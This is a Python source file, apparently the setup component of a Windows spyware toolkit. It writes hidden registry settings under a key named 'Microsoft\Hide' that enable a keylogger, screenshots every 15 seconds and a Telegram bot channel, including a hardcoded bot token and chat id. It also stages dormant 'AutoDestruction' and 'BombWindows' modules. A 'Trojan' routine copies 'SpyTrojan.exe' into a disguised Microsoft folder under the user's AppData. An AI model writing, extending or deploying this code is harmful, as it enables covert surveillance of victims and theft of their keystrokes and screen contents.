import shutil
import winreg
import os

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'   # ignore class


class WinRegistry:
    def __init__(self, path):
        self.afterPath = path
        self.HKEY = None
        self.__listHKEY = [
            'HKEY_CLASSES_ROOT',
            'HKEY_CURRENT_USER',
            'HKEY_LOCAL_MACHINE',
            'HKEY_DYN_DATA',
            'HKEY_PERFORMANCE_DATA',
            'HKEY_USERS',
            'HKEY_CURRENT_CONFIG']

        for hkey in self.__listHKEY:
            index = self.afterPath.find(hkey)  # getting boot index
            if index != -1:  # Only if it was successful
                if str(hkey) == 'HKEY_CLASSES_ROOT':
                    self.HKEY = winreg.HKEY_CLASSES_ROOT
                elif str(hkey) == 'HKEY_CURRENT_USER':
                    self.HKEY = winreg.HKEY_CURRENT_USER
                elif str(hkey) == 'HKEY_LOCAL_MACHINE':
                    self.HKEY = winreg.HKEY_LOCAL_MACHINE
                elif str(hkey) == 'HKEY_DYN_DATA':
                    self.HKEY = winreg.HKEY_DYN_DATA
                elif str(hkey) == 'HKEY_PERFORMANCE_DATA':
                    self.HKEY = winreg.HKEY_PERFORMANCE_DATA
                elif str(hkey) == 'HKEY_USERS':
                    self.HKEY = winreg.HKEY_CLASSES_ROOT
                elif str(hkey) == 'HKEY_CURRENT_CONFIG':
                    self.HKEY = winreg.HKEY_CURRENT_CONFIG
                else:
                    print('Error path invalido')
                index = index + len(hkey) + 1  # Index cut
                end = len(self.afterPath)  # End cut
                self.afterPath = self.afterPath[index:end]  # cut path

    def __format_after_path(self):
        afterPath = self.afterPath
        if afterPath != "":
            return afterPath + "\\"
        else:
            return afterPath

    def __create_value(self, type, nameValue, value):
        self.create_key('')
        opened_key = winreg.OpenKey(self.HKEY, self.afterPath, 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(opened_key, nameValue, 0, type, value)
        opened_key.Close()

    def create_key(self, keyName):
        winreg.CreateKeyEx(self.HKEY, self.__format_after_path() + keyName, 0, winreg.KEY_ALL_ACCESS)

    def delete_key(self, keyName):
        try:
            winreg.DeleteKeyEx(self.HKEY, self.__format_after_path() + keyName, winreg.KEY_ALL_ACCESS, 0)
        except:
            pass

    def read_value(self, nameValue):
        # Open key
        opened_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.afterPath, 0,
                                    winreg.KEY_ALL_ACCESS)  # Error if key is emply
        # Create value
        f = winreg.QueryValueEx(opened_key, nameValue)
        print(f[0])
        return f[0]

    def set_value_String(self, nameValue, value):
        self.__create_value(winreg.REG_SZ, nameValue, value)

    def set_value_Binary(self, nameValue, value):
        self.__create_value(winreg.REG_BINARY, nameValue, value)

    def set_value_DWORD(self, nameValue, value):
        self.__create_value(winreg.REG_DWORD, nameValue, value)

    def set_value_QWORD(self, nameValue, value):
        self.__create_value(winreg.REG_QWORD, nameValue, value)

    def set_value_MultiString(self, nameValue, value):
        self.__create_value(winreg.REG_MULTI_SZ, nameValue, value)

    def set_value_ExpandableString(self, nameValue, value):
        self.__create_value(winreg.REG_EXPAND_SZ, nameValue, value)

    def delete_value(self, nameValue):
        try:
            # Open key
            opened_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.afterPath, 0,
                                        winreg.KEY_ALL_ACCESS)  # Error if key is emply
            # Create value
            winreg.DeleteValue(opened_key, nameValue)
        except:
            pass

# not enabled this version
class AutoDestruction:
    def __init__(self, pathReg, active, active_now, day, year):
        self.__path = pathReg
        self.active = active
        self.active_now = active_now
        self.day = day
        self.year = year
    def set_values(self):
        reg = WinRegistry(self.__path)
        reg.set_value_DWORD('active', self.active)
        reg.set_value_DWORD('active_now', self.active_now)
        reg.set_value_DWORD('day', self.day)
        reg.set_value_DWORD('year', self.year)
        print(f"{bcolors.BOLD}{bcolors.OKBLUE}AutoDestruction: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")

# not enabled this version
class BombWindows:
    def __init__(self, pathReg, active, active_now, day, year):
        self.__path = pathReg
        self.active = active
        self.active_now = active_now
        self.day = day
        self.year = year
    def set_values(self):
        reg = WinRegistry(self.__path)
        reg.set_value_DWORD('active', self.active)
        reg.set_value_DWORD('active_now', self.active_now)
        reg.set_value_DWORD('day', self.day)
        reg.set_value_DWORD('year', self.year)
        print(f"{bcolors.BOLD}{bcolors.OKBLUE}BombWindows: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")


class Keylogger:
    def __init__(self, pathReg, active, limit):
        self.__path = pathReg
        self.active = active
        self.limit = limit
    def set_values(self):
        reg = WinRegistry(self.__path)
        reg.set_value_DWORD('active', self.active)
        reg.set_value_DWORD('limit', self.limit)
        print( f"{bcolors.BOLD}{bcolors.OKBLUE}Keylogger: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")


class Screenshot:
    def __init__(self, pathReg, active, intervalSeconds, cache_path):
        self.__path = pathReg
        self.value_active = active
        self.intervalSeconds = intervalSeconds
        self.cache_path = cache_path
    def set_values(self):
        reg = WinRegistry(self.__path)
        reg.set_value_DWORD('active', self.value_active)
        reg.set_value_DWORD('interval_seconds', self.intervalSeconds)
        reg.set_value_ExpandableString('path', self.cache_path)
        print(f"{bcolors.BOLD}{bcolors.OKBLUE}Screenshot: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")


class TelegramBot:
    def __init__(self, path_registry, id, token):
        self.__path = path_registry
        self.id = id    # Array # Saltos de linea
        self.token = token
    def set_values(self):
        reg = WinRegistry(self.__path)
        reg.set_value_MultiString('id', self.id)
        reg.set_value_String('token', self.token)
        print(f"{bcolors.BOLD}{bcolors.OKBLUE}"
              f"TelegramBot: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")

class Trojan:
    def __init__(self, path_registry, debug , delay, path_software, name_software, username):
        self.__path_registry = path_registry
        self.__debug = debug    # not enabled this version
        self.__delay = delay    # not enable this version
        self.__path_software = path_software
        self.__name_software = name_software
        self.__path_complete = self.__path_software + '\\' + self.__name_software
        self.__user = username


    def set_values(self):
        reg = WinRegistry(self.__path_registry)
        reg.set_value_DWORD('debug', self.__debug)
        reg.set_value_DWORD('delay', self.__delay)
        reg.set_value_ExpandableString('sub_path', self.__path_software)
        reg.set_value_ExpandableString('name_software', self.__name_software)
        reg.set_value_ExpandableString('path', self.__path_complete)
        reg.set_value_String('username', self.__user)

        print(f"{bcolors.BOLD}{bcolors.OKBLUE}"
              f"Trojan: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")
    def __create_folder(self, path):
        try:  # Intenta crear la dirección
            os.makedirs(path)
            print("[CreateFolders] Success create folder: " + path)
        except:
            print("[CreateFolders] Folder really exist: " + path)

    def infection(self):  # Se Replica en el sistema
        self.__create_folder(path=self.__path_software)
        try:
            with open(self.__path_complete, 'r') as f:  # Verifica si el keylogger se encuentra oculto en el sistema
                print("[Trojan] - Ya se encuentra en el sistema : \n" + self.__path_complete)
        except:
            print("[Trojan] - No se encuentra en el sistema...\nProceso Troyano...")
            try:
                shutil.copy(self.__name_software, self.__path_complete)  # Intenta ocultar el keylogger en una carpeta
                print("\n[Trojan] - Se replico en el sistema correctamente")
            except:
                print("\n[Trojan] - Hubo un problema al replicar en el sistema")


if __name__ == '__main__':

    AutoDestruction(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\AutoDestruction',
                    active=0,
                    active_now=0,  # ignore, will be used in a future update
                    day=00,
                    year=0000
                    ).set_values()
    BombWindows(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\BombWindows',
                active=0,
                active_now=0,   # ignore, will be used in a future update
                day=00,
                year=0000
                ).set_values()
    Keylogger(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Keylogger',
              active=1,
              limit=150
              ).set_values()
    Screenshot(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Screenshot',
               active=1,
               intervalSeconds=15,
               cache_path='C:\\Users\\' + str(os.getlogin()) + r'\AppData\Local\Microsoft\Office\16.0\Floodgate\temp'
               ).set_values()
    TelegramBot(path_registry=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot',
                id=["-1001322369309"],
                token="1345614169:AAE7O_jRBhIkq_minXh52Ws2SV3wlPfp8QM",
                ).set_values()
    trojan = Trojan(path_registry=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide',
                    debug=0,
                    delay=0,
                    path_software='C:\\Users\\' + str(os.getlogin()) + r'\AppData\Local\Microsoft\Windows\Shell\temp',
                    name_software= 'SpyTrojan.exe',
                    username=str(os.getlogin())
                    )
    trojan.set_values()
    trojan.infection()




